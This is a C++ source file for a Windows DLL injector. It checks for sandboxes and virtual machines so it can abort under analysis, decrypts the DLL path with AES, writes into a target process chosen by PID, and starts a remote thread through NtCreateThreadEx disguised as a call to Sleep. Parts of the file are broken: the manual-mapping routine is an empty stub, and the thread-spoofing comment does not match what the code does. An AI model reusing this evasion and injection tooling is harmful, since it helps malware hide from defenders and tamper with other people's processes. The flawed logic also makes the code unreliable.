#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#include <string>
#include <thread>
#include <chrono>
#include <wincrypt.h>
#pragma comment(lib, "advapi32.lib")

// ------------------------ AES ENCRYPTION ------------------------ //
// AES encryption/decryption using Windows CryptAPI (simplified wrapper)
bool aes_decrypt(const std::vector<BYTE>& encrypted, std::vector<BYTE>& decrypted, const std::string& password) {
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    HCRYPTKEY hKey = 0;

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return false;
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) return false;
    if (!CryptHashData(hHash, (BYTE*)password.c_str(), password.length(), 0)) return false;
    if (!CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey)) return false;

    decrypted = encrypted;
    DWORD dataLen = decrypted.size();
    if (!CryptDecrypt(hKey, 0, TRUE, 0, decrypted.data(), &dataLen)) return false;
    decrypted.resize(dataLen);

    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    return true;
}

// ------------------------ SANDBOX DETECTION ------------------------ //
bool is_sandbox() {
    if (GetTickCount() < 10000) return true; // uptime check
    if (GetSystemMetrics(SM_CLEANBOOT) != 0) return true; // clean boot = safe mode

    POINT p;
    if (!GetCursorPos(&p)) return true; // no mouse = VM

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors <= 2) return true; // limited CPU cores

    return false;
}

// ------------------------ MANUAL MAPPING STUB ------------------------ //
// Note: full PE loader should parse headers, fix imports, and call DllMain manually.
// This placeholder shows where that logic would be injected.
bool ManualMapDLL(HANDLE hProcess, const std::vector<BYTE>& dllBytes) {
    // Stub: Real manual mapping logic must be implemented here.
    std::cout << "[*] Manual mapping stub (not implemented in this demo).\n";
    return false;
}

// ------------------------ THREAD SPOOFING ------------------------ //
HANDLE SpoofedThread(HANDLE hProcess, LPVOID shellcodeAddress) {
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    LPVOID pSleep = GetProcAddress(hKernel32, "Sleep");
    HANDLE hThread = NULL;

    typedef NTSTATUS(WINAPI* pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, LPTHREAD_START_ROUTINE, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

    NTSTATUS status = NtCreateThreadEx(
        &hThread, 0x1FFFFF, NULL, hProcess,
        (LPTHREAD_START_ROUTINE)pSleep, (PVOID)shellcodeAddress, // will jump from Sleep after delay
        FALSE, 0, 0, 0, NULL);

    if (!NT_SUCCESS(status)) return NULL;
    return hThread;
}

// ------------------------ DLL INJECTION ENTRY ------------------------ //
bool InjectDLL(DWORD pid, const std::vector<BYTE>& encryptedDllPath, const std::string& password) {
    if (is_sandbox()) {
        std::cout << "[!] Sandbox detected. Aborting.\n";
        return false;
    }

    std::vector<BYTE> decrypted;
    if (!aes_decrypt(encryptedDllPath, decrypted, password)) {
        std::cout << "[!] AES decryption failed.\n";
        return false;
    }

    std::string dllPath(reinterpret_cast<char*>(decrypted.data()));
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return false;

    LPVOID alloc = VirtualAllocEx(hProcess, NULL, dllPath.size() + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!alloc) return false;

    if (!WriteProcessMemory(hProcess, alloc, dllPath.c_str(), dllPath.size() + 1, NULL)) return false;

    // Spoof thread to look like it's calling Sleep
    HANDLE hThread = SpoofedThread(hProcess, alloc);
    if (!hThread) return false;

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return true;
}

int main() {
    DWORD targetPid;
    std::string password = "supersecret";

    // This should be generated with AES encryption externally
    std::vector<BYTE> encryptedDllPath = {
        0x2A, 0x73, 0x8F, 0x44, 0x19, 0xC1, 0x5E, 0xD4,
        0x01, 0x2B, 0x43, 0x98, 0xA3, 0xFA, 0x00, 0x11
    }; // <-- replace with real encrypted bytes

    std::cout << "Enter PID to inject: ";
    std::cin >> targetPid;

    if (InjectDLL(targetPid, encryptedDllPath, password))
        std::cout << "Injection succeeded!\n";
    else
        std::cout << "Injection failed.\n";

    return 0;
}
